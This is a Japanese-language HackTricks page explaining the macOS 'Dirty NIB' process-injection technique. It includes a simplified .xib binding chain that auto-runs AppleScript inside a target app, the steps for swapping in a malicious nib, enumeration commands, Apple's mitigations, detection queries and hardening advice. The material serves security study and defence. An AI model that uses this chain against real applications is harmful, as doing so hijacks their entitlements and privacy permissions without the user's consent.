# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB は、署名済み macOS app bundle 内の Interface Builder ファイル（.xib/.nib）を悪用し、攻撃者が制御するロジックを対象プロセス内で実行する手法です。これにより、そのプロセスの entitlements と TCC permissions を継承できます。この technique は、当初 xpn（MDSec）によって文書化され、その後 Sector7 によって一般化および大幅に拡張されました。Sector7 は、macOS 13 Ventura および macOS 14 Sonoma における Apple の mitigations についても解説しています。<sup>[[1]](#references)[[2]](#references)</sup> 背景や詳細については、末尾の references を参照してください。

> TL;DR
> • macOS 13 Ventura より前: bundle の MainMenu.nib（または startup 時に読み込まれる別の nib）を置き換えることで、process injection と、しばしば privilege escalation を確実に実現できました。
> • macOS 13（Ventura）以降、および macOS 14（Sonoma）での改善後: 初回起動時の詳細な検証、bundle protection、Launch Constraints、新しい TCC の「App Management」permission により、無関係な app による post-launch の nib tampering は大幅に防止されています。ただし、ニッチなケース（例: 同じ developer の tooling による自分の app の変更、またはユーザーから App Management/Full Disk Access を付与された terminal）では、攻撃が依然として可能な場合があります。


## NIB/XIB files とは

Nib（NeXT Interface Builder の略）files は、AppKit app で使用される serialized UI object graphs です。最新の Xcode では、編集可能な XML .xib files が保存され、build 時に .nib に compile されます。一般的な app は `NSApplicationMain()` を通じて main UI を読み込み、app の Info.plist にある `NSMainNibFile` key を読み取って、runtime に object graph を instantiate します。

この attack を可能にする主なポイント:
- NIB loading は、任意の Objective-C classes を、それらが NSSecureCoding に準拠している必要なく instantiate します（Apple の nib loader は、`initWithCoder:` が利用できない場合、`init`/`initWithFrame:` に fallback します）。
- Cocoa Bindings を悪用すると、nib の instantiate 時に methods を呼び出せます。これには、user interaction を必要としない chained calls も含まれます。


## Dirty NIB injection process（attacker view）

Ventura より前の classic な flow:
1) 悪意のある .xib を作成する
- `NSAppleScript` object（または `NSTask` などの別の「gadget」classes）を追加する。
- payload（例: AppleScript または command arguments）を title に含む `NSTextField` を追加する。
- bindings を介して target object の methods を呼び出すように、1 つ以上の `NSMenuItem` objects を wire する。

2) user clicks なしで auto-trigger する
- bindings を使用して menu item の target/selector を設定し、private な `_corePerformAction` method を呼び出すことで、nib の loading 時に action が自動的に発生するようにする。これにより、user が button を click する必要がなくなります。

.xib 内の auto-trigger chain の最小例（わかりやすさのため簡略化）:
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
これは、nib の読み込み時に対象プロセス内で任意の AppleScript 実行を可能にします。<sup>[[1]](#references)</sup> 高度な chain では、次のことが可能です。
- 任意の AppKit クラス（例: `NSTask`）をインスタンス化し、`-launch` のような引数を取らないメソッドを呼び出す。
- 上記の binding trick を使用して、object 引数を伴う任意の selector を呼び出す。
- AppleScriptObjC.framework をロードして Objective-C への bridge を確立し、選択した C API まで呼び出す。
- Python.framework がまだ含まれている古いシステムでは、Python への bridge を確立し、`ctypes` を使用して任意の C function を呼び出す（Sector7 の research）。<sup>[[2]](#references)</sup>

3) アプリの nib を置き換える
- target.app を書き込み可能な場所にコピーし、例えば `Contents/Resources/MainMenu.nib` を malicious nib に置き換えてから、target.app を実行します。Ventura より前のシステムでは、初回の Gatekeeper assessment 後、続く launch では簡易的な signature check だけが実行されていたため、（.nib のような）実行可能ではない resource は再検証されませんでした。

表示テスト用の AppleScript payload の例:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)

Apple は、modern macOS における Dirty NIB の実用性を大幅に低下させる、いくつかの system-wide な mitigation を導入しました。<sup>[[2]](#references)</sup>
- First-launch deep verification と bundle protection (macOS 13 Ventura)
- 任意の app を初回実行するとき（quarantined かどうかを問わず）、deep signature check によってすべての bundle resources が検証されます。その後、bundle は保護され、同じ developer の app（または app によって明示的に許可された app）だけがその内容を変更できるようになります。他の app が別の app の bundle に書き込むには、新しい TCC の “App Management” permission が必要です。
- Launch Constraints (macOS 13 Ventura)
- System/Apple-bundled apps は別の場所にコピーして起動できません。これにより、OS app を “/tmp にコピーして patch し、実行する” approach は機能しなくなります。
- macOS 14 Sonoma における improvements
- Apple は App Management を harden し、Sector7 が指摘した既知の bypass（例: CVE‑2023‑40450）を修正しました。Python.framework はそれ以前（macOS 12.3）に削除されており、一部の privilege-escalation chain が機能しなくなっています。
- Gatekeeper/Quarantine changes
- この technique に影響を与えた Gatekeeper、provenance、assessment changes についての broader discussion は、以下で参照されている page を確認してください。

> Practical implication
> • Ventura+ では、process に App Management が付与されているか、target と同じ Team ID で signed されていない限り、third-party app の .nib を変更することは一般的にできません（例: developer tooling）。
> • shell/terminal に App Management または Full Disk Access を付与すると、その terminal の context 内で code を execute できるものについて、この attack surface が実質的に再び開かれます。


### Addressing Launch Constraints

Launch Constraints は、Ventura 以降、多くの Apple app を default 以外の location から実行することを block します。Ventura 以前の workflow、つまり Apple app を temporary directory にコピーし、`MainMenu.nib` を modify して launch する方法に依存していた場合、>= 13.0 では fail することを想定してください。


## Enumerating targets and nibs (useful for research / legacy systems)

- UI が nib-driven の app を locate する:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- bundle 内で候補となる nib リソースを探す:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- コード署名を詳細に検証する（リソースを改ざんして再署名していない場合は失敗する）:
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> 注: modern macOSでは、適切な認証なしに別のアプリのbundleへ書き込もうとすると、bundle protection/TCCによってブロックされます。


## Detection and DFIR tips

- bundle resourcesのFile integrity monitoring
- インストール済みアプリの`Contents/Resources/*.nib`や、その他のnon-executable resourcesに対するmtime/ctimeの変更を監視します。
- Unified logsとprocess behavior
- GUIアプリ内での予期しないAppleScript実行や、AppleScriptObjCまたはPython.frameworkを読み込むprocessを監視します。例:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proactive assessments
- 重要なアプリ全体に対して定期的に`codesign --verify --deep`を実行し、resourcesが完全性を維持していることを確認します。
- Privilege context
- TCCの「App Management」またはFull Disk Accessを持つユーザーやprocess（特にterminalとmanagement agent）を監査します。一般用途のshellからこれらを削除すると、Dirty NIB形式のtamperingを簡単に再有効化されることを防げます。


## Defensive hardening (developers and defenders)

- programmatic UIを優先するか、nibからinstantiateされるものを制限します。強力なclass（例:`NSTask`）をnib graphに含めないようにし、任意のobject上でselectorを間接的に呼び出すbindingsを避けます。
- Library Validationを有効にしたhardened runtimeを採用します（modern appではすでに標準です）。これはnib injection自体を阻止するものではありませんが、容易なnative code loadingをブロックし、攻撃者をscripting-only payloadへ追い込みます。
- 一般用途のtoolで広範なApp Management permissionを要求または依存しないでください。MDMでApp Managementが必要な場合は、そのcontextをuser-driven shellから分離します。
- app bundleのintegrityを定期的に検証し、update mechanismによってbundle resourcesが自動的に修復されるようにします。


## Related reading in HackTricks

このtechniqueに影響するGatekeeper、quarantine、provenanceの変更について詳しく学べます。

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB（Pagesの例を含むoriginal write-up）](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – process injectionをview(s)に持ち込む: nib filesを使用してすべてのmacOS appをexploitする（2024年4月5日）](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
